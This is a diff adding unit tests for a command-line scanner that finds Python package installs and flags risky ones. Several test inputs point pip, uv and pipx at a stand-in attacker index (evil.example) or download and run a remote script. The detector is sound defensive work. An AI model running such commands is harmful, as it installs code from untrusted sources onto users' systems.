@@ -232,3 +232,103 @@ describe('scanCommandLine refuses to guess', () => {
     expect(scanCommandLine('$EDITOR notes.md').unreadable).toBeUndefined();
   });
 });
+
+describe('scanCommandLine finds Python packages', () => {
+  it.each([
+    ['pip install requests', ['pip:pypi:requests']],
+    ["pip3 install 'requests>=2' flask==3.0", ['pip:pypi:requests>=2', 'pip:pypi:flask==3.0']],
+    ['pip3.12 install -U requests', ['pip:pypi:requests']],
+    ['python -m pip install requests', ['pip:pypi:requests']],
+    ['python3.12 -I -W ignore -m pip install --user requests', ['pip:pypi:requests']],
+    ['py -m pip install requests', ['pip:pypi:requests']],
+    ['sudo python3 -m pip install requests', ['pip:pypi:requests']],
+    ['pip --disable-pip-version-check install --upgrade requests', ['pip:pypi:requests']],
+    ['pip install -r requirements.txt', []],
+    ['pip install -rrequirements.txt requests', ['pip:pypi:requests']],
+    ['pip install --constr constraints.txt requests', ['pip:pypi:requests']],
+    ['pip install -c constraints.txt -t vendor requests', ['pip:pypi:requests']],
+    ['pip install -e .', ['pip:pypi:.']],
+    ['pip install -e ./lib -e mylib', ['pip:pypi:./lib', 'pip:pypi:./mylib']],
+    ['pip install -Ue mylib', ['pip:pypi:./mylib']],
+    ['pip install git+https://github.com/psf/requests', ['pip:pypi:git+https://github.com/psf/requests']],
+    ['pip install -i https://pypi.org/simple requests', ['pip:pypi:requests']],
+    ['pip uninstall -y requests', []],
+    ['pip list', []],
+    ['python -m venv .venv', []],
+    ['python script.py install requests', []],
+    ['uv add requests', ['uv:pypi:requests']],
+    ["uv add 'httpx>=0.20' --dev --optional web", ['uv:pypi:httpx>=0.20']],
+    ['uv add -m "python_version<\'3.12\'" tomli', ['uv:pypi:tomli']],
+    ['uv add --editable ./lib', ['uv:pypi:./lib']],
+    ['uv add --no-binary requests', ['uv:pypi:requests']],
+    ['uv pip install requests', ['uv:pypi:requests']],
+    ['uv pip install --no-binary :all: -e ./lib requests', ['uv:pypi:./lib', 'uv:pypi:requests']],
+    ['uv pip install -r requirements.txt', []],
+    ['uv --quiet pip install requests', ['uv:pypi:requests']],
+    ['uv tool install ruff', ['uv:pypi:ruff']],
+    ['uv tool install --with ruff-lsp,black ruff', ['uv:pypi:ruff-lsp', 'uv:pypi:black', 'uv:pypi:ruff']],
+    ['uv tool install -e ruff', ['uv:pypi:ruff']],
+    ['uvx ruff check .', ['uv:pypi:ruff']],
+    ['uvx ruff@0.6.0 check', ['uv:pypi:ruff@0.6.0']],
+    ["uvx --from 'ruff==0.6' ruff", ['uv:pypi:ruff==0.6']],
+    ["uvx --with 'httpx>=0.2,<1' --with rich,typer black", ['uv:pypi:httpx>=0.2,<1', 'uv:pypi:rich', 'uv:pypi:typer', 'uv:pypi:black']],
+    ['uvx -wrich black', ['uv:pypi:rich', 'uv:pypi:black']],
+    ['uv tool run black .', ['uv:pypi:black']],
+    ['uvx python -c "print(1)"', []],
+    ['uvx pypy@3.10', []],
+    ['uv run pytest', []],
+    ['uv run --with rich python x.py', ['uv:pypi:rich']],
+    ['uv run -m pip install evil', ['pip:pypi:evil']],
+    ['uv run python -m pip install evil', ['pip:pypi:evil']],
+    ['uv sync', []],
+    ['uv lock --upgrade', []],
+    ['poetry add requests@^2.0', ['poetry:pypi:requests@^2.0']],
+    ['poetry add --group dev pytest pytest-cov', ['poetry:pypi:pytest', 'poetry:pypi:pytest-cov']],
+    ['poetry add -Gdev pytest', ['poetry:pypi:pytest']],
+    ['poetry -C sub add "requests[socks]>=2"', ['poetry:pypi:requests[socks]>=2']],
+    ['poetry install --with dev', []],
+    ['poetry update', []],
+    ['pipx install black', ['pip:pypi:black']],
+    ['pipx install --preinstall black-plugin -f black', ['pip:pypi:black-plugin', 'pip:pypi:black']],
+    ['pipx run pycowsay moo', ['pip:pypi:pycowsay']],
+    ["pipx run --spec 'black==24.1.0' black .", ['pip:pypi:black==24.1.0']],
+    ['pipx run test.py', []],
+    ['python -m pipx install black', ['pip:pypi:black']],
+  ])('%s', (line, expected) => {
+    expect(specs(line)).toEqual(expected);
+    expect(scanCommandLine(line).unreadable).toBeUndefined();
+  });
+});
+
+describe('scanCommandLine refuses to guess for Python', () => {
+  it.each([
+    ['pip install --index-url https://evil.example/simple requests', '--index-url may point'],
+    ['pip install -ihttps://evil.example/simple requests', '-i may point'],
+    ['pip install -Uihttps://evil.example/simple requests', '-i may point'],
+    ['pip install --extra https://evil.example/simple requests', '--extra-index-url may point'],
+    ['pip install --find-links ./wheels requests', '--find-links may point'],
+    ['pip install --pypi-url=https://evil.example/simple requests', '--pypi-url may point'],
+    ['PIP_INDEX_URL=https://evil.example/simple pip install requests', 'PIP_INDEX_URL may point'],
+    ['export PIP_EXTRA_INDEX_URL=https://evil.example/simple && python -m pip install requests', 'PIP_EXTRA_INDEX_URL may point'],
+    ['PIP_CONFIG_FILE=evil.conf pip install requests', 'PIP_CONFIG_FILE may point'],
+    ['pip install $PKG', '"$PKG" is expanded by the shell'],
+    ['uv add --index evil=https://evil.example/simple requests', '--index may point'],
+    ['uv pip install --default-index https://evil.example/simple requests', '--default-index may point'],
+    ['uv pip install -f ./wheels requests', '-f may point'],
+    ['uvx --config-file evil.toml ruff', '--config-file may point'],
+    ['UV_INDEX=https://evil.example/simple uv add requests', 'UV_INDEX may point'],
+    ['uv run https://example.com/script.py', 'downloads and runs a script'],
+    ['pipx run https://example.com/script.py', 'downloads and runs a script'],
+    ['poetry add --source private requests', '--source may point'],
+    ['pipx install --pip-args="--extra-index-url https://evil.example" black', '--pip-args may point'],
+    ['pipx install --index https://evil.example/simple black', '--index-url may point'],
+    ['python -m pip install --index-url "$INDEX" requests', 'is expanded by the shell'],
+  ])('%s', (line, reason) => {
+    expect(scanCommandLine(line).unreadable).toContain(reason);
+  });
+
+  it('accepts PyPI itself as the index', () => {
+    expect(scanCommandLine('uv pip install --default-index https://pypi.org/simple/ requests').unreadable).toBeUndefined();
+    expect(scanCommandLine('PIP_INDEX_URL=https://pypi.org/simple pip install requests').unreadable).toBeUndefined();
+  });
+});
